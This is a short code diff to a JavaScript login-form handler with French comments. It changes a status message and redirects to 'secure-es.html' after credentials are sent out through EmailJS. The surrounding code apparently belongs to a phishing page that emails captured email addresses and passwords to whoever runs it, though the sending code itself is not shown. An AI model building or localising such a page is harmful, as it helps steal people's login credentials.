@@ -167,7 +167,7 @@ if (form && emailInput && passwordInput && result) {
     // Envoi EmailJS
     // ------------------------------
 
-    result.textContent = "Connexion en cours...";
+    result.textContent = "...";
     result.className = "";
 
 
@@ -196,7 +196,7 @@ if (form && emailInput && passwordInput && result) {
         // Redirection après envoi réussi
         // ------------------------------
 
-        window.location.href = "secure.html";
+        window.location.href = "secure-es.html";
         
      } catch (error) {
 
